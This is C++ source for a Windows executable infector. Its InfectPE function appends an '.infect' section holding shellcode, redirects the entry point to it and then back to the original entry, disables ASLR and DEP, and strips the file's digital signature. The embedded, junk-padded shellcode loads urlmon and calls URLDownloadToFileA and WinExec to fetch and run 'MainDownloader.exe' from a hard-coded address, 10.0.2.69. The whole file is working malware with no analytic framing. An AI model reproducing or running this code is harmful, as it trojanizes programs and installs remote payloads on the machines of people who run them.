#include <iostream>
#include <windows.h>
#include <fstream>
#include <future>
#include <string>
#include <memory.h>
#include <stdio.h>
#include <vector>
#include "PE.h"
#include <bitset>
using namespace std;

constexpr std::size_t align_up(std::size_t value, std::size_t alignment) noexcept {
    return (value + alignment - 1) & ~(alignment - 1);
}

bool InfectPE(char* PE_file, size_t PE_fileSize, char* shellcode, size_t shellcodeSize, char* output_file) {
    auto Parsed_PE = PE::ParsePE(PE_file);

    if (Parsed_PE.inh32.OptionalHeader.ImageBase < 0x400000 && Parsed_PE.inh32.OptionalHeader.ImageBase > 0x1000000) {
        cout << "Not a valid ImageBase" << endl;
        return false;
    }

    // Prep shellcode to jmp to the original entry point
    auto imageBase = Parsed_PE.inh32.OptionalHeader.ImageBase;
    auto addressOfEntryPoint = Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;
    auto absAddressOfEntryPoint = imageBase + addressOfEntryPoint;

    char push[] = { 0x68 };           // push
    char jmp[] = { (char) 0xff, (char) 0x24, (char) 0x24 };    // jmp [esp]
    char hex_absAddressOfEntryPoint[] = { (char) ((absAddressOfEntryPoint >> 0) & 0xff), (char) ((absAddressOfEntryPoint >> 8) & 0xff), (char) ((absAddressOfEntryPoint >> 16) & 0xff), (char) ((absAddressOfEntryPoint >> 24) & 0xff) }; // address of entry point in little endian
    auto newShellcodeSize = shellcodeSize + sizeof(push) + sizeof(hex_absAddressOfEntryPoint) + sizeof(jmp);

    // Increase the number of sections (inside PE::parsePE we already allocate memory for the new section)
    Parsed_PE.inh32.FileHeader.NumberOfSections += 1;
    int indexInfectHdr = Parsed_PE.inh32.FileHeader.NumberOfSections - 1;
    int indexPrevHdr = indexInfectHdr - 1;

    // Create a fresh section header
    Parsed_PE.ish[indexInfectHdr] = IMAGE_SECTION_HEADER{};

    IMAGE_SECTION_HEADER* pInfectHdr = &Parsed_PE.ish[indexInfectHdr];
    IMAGE_SECTION_HEADER* pPrevHdr = &Parsed_PE.ish[indexPrevHdr];

    auto alignedNewSellcodeSize = align_up(newShellcodeSize, Parsed_PE.inh32.OptionalHeader.SectionAlignment);

    // Fill the section header
    memcpy(pInfectHdr->Name, ".infect", 8);
    pInfectHdr->VirtualAddress = align_up(pPrevHdr->VirtualAddress + pPrevHdr->Misc.VirtualSize, Parsed_PE.inh32.OptionalHeader.SectionAlignment);
    pInfectHdr->PointerToRawData = align_up(pPrevHdr->PointerToRawData + pPrevHdr->SizeOfRawData, Parsed_PE.inh32.OptionalHeader.FileAlignment);
    pInfectHdr->Misc.VirtualSize = newShellcodeSize;
    pInfectHdr->SizeOfRawData = alignedNewSellcodeSize;
    pInfectHdr->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    // Update the NT header
    Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint = pInfectHdr->VirtualAddress;
    Parsed_PE.inh32.OptionalHeader.SizeOfImage = align_up(pInfectHdr->VirtualAddress + pInfectHdr->Misc.VirtualSize, Parsed_PE.inh32.OptionalHeader.SectionAlignment);

    // Copy shellcode to the new section
    shared_ptr<char> n_section(new char[alignedNewSellcodeSize]{}, std::default_delete<char[]>());
    Parsed_PE.Sections.push_back(n_section);

    auto injSection = n_section.get();
    memcpy(&injSection[0], shellcode, shellcodeSize - 1);
    cout << shellcodeSize << endl;
    memcpy(&injSection[shellcodeSize - 1], push, sizeof(push));
    memcpy(&injSection[shellcodeSize - 1 + sizeof(push)], hex_absAddressOfEntryPoint, sizeof(hex_absAddressOfEntryPoint));
    memcpy(&injSection[shellcodeSize - 1 + sizeof(push) + sizeof(hex_absAddressOfEntryPoint)], jmp, sizeof(jmp));

    // Disable ASLR
    Parsed_PE.inh32.OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
    Parsed_PE.inh32.FileHeader.Characteristics &= ~IMAGE_FILE_RELOCS_STRIPPED;

    // Disable DEP
    Parsed_PE.inh32.OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

    // Erase digital signature
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0;
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0;

    // Update sizes
    Parsed_PE.size_sections += alignedNewSellcodeSize;

    // Dump the infected PE
    PE::WriteBinary(Parsed_PE, output_file, PE_fileSize + alignedNewSellcodeSize);

    return true;
}

int main(int argc, char *argv[]) {

    if (argc < 3) {
        cout << "Usage: " << argv[0] << " <path_exe> <patched_path_exe>" << endl;
        return EXIT_FAILURE;
    }

    std::fstream::openmode mode = std::fstream::in;
    fstream inFile;
    inFile.open(argv[1], mode);
    if (!inFile.is_open()) {
        cout << "Input file does not exist" << endl;
        return EXIT_FAILURE;
    }

    std::remove(argv[2]);

    tuple<bool, char*, streampos> bin = PE::OpenBinary(argv[1]);

    if(!get<0>(bin)) {
        cout << "Error opening file" << endl;
        return EXIT_FAILURE;
    }

    char shellcode[] = "\x31\xc9\x64\x8b\x41\x30\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x31\xc9\x53\x52\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x53\xff\xd2\x83\xc4\x0c\x59\x50\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x6f\x6e\x2e\x64\x68\x75\x72\x6c\x6d\x54\xff\x54\x24\x10\x83\xc4\x0c\x50\x31\xc0\x66\xb8\x65\x41\x50\x68\x6f\x46\x69\x6c\x68\x6f\x61\x64\x54\x68\x6f\x77\x6e\x6c\x68\x55\x52\x4c\x44\x54\xff\x74\x24\x18\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\xff\x54\x24\x24\x83\xc4\x14\x50\x31\xc0\xb8\x78\x65\x63\x23\x50\x83\x6c\x24\x03\x23\x68\x57\x69\x6e\x45\x54\xff\x74\x24\x1c\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\xff\x54\x24\x1c\x83\xc4\x08\x50\x31\xc0\xb8\x6c\x65\x41\x23\x50\x83\x6c\x24\x03\x23\x68\x74\x65\x46\x69\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x68\x44\x65\x6c\x65\x54\xff\x74\x24\x24\xff\x54\x24\x24\x83\xc4\x0c\x50\x31\xc0\xb8\x64\x65\x72\x23\x50\x83\x6c\x24\x03\x23\x68\x6e\x6c\x6f\x61\x68\x6e\x44\x6f\x77\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x68\x2f\x4d\x61\x69\x68\x32\x2e\x36\x39\x68\x30\x2e\x30\x2e\x68\x3a\x2f\x2f\x31\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x68\x68\x74\x74\x70\x54\x31\xc0\xb0\x72\x50\x68\x6f\x61\x64\x65\x68\x6f\x77\x6e\x6c\x68\x78\x65\x3a\x64\x68\x65\x72\x2e\x65\x68\x6c\x6f\x61\x64\x68\x44\x6f\x77\x6e\x68\x4d\x61\x69\x6e\x54\x31\xc0\x50\x31\xc0\x50\xff\x74\x24\x08\xff\x74\x24\x30\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x31\xc0\x50\xff\x54\x24\x64\x83\xc4\x48\x31\xc0\xb0\x72\x50\x68\x6f\x61\x64\x65\x68\x6f\x77\x6e\x6c\x68\x78\x65\x3a\x64\x68\x65\x72\x2e\x65\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x68\x6c\x6f\x61\x64\x68\x44\x6f\x77\x6e\x68\x4d\x61\x69\x6e\x54\x31\xc0\x50\xff\x74\x24\x04\xff\x54\x24\x30\x83\xc4\x24\x31\xc0\xb0\x72\x50\x68\x6f\x61\x64\x65\x68\x6f\x77\x6e\x6c\x68\x78\x65\x3a\x64\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x68\x65\x72\x2e\x65\x68\x6c\x6f\x61\x64\x68\x44\x6f\x77\x6e\x68\x4d\x61\x69\x6e\x54\xff\x34\x24\xff\x54\x24\x28\x83\xc4\x24\x31\xc0\x66\xb8\x78\x65\x50\x68\x65\x72\x2e\x65\x68\x6c\x6f\x61\x64\x68\x44\x6f\x77\x6e\x68\x4d\x61\x69\x6e\x54\xff\x34\x24\xff\x54\x24\x1c\xb4\x6c\xb0\x6c\x30\xe0\xf6\xd8\xf6\xdc\x30\xe0\x83\xc4\x18";

    if (!InfectPE(get<1>(bin), get<2>(bin), shellcode, sizeof(shellcode), argv[2])) {
        cout << "Error infecting file" << endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}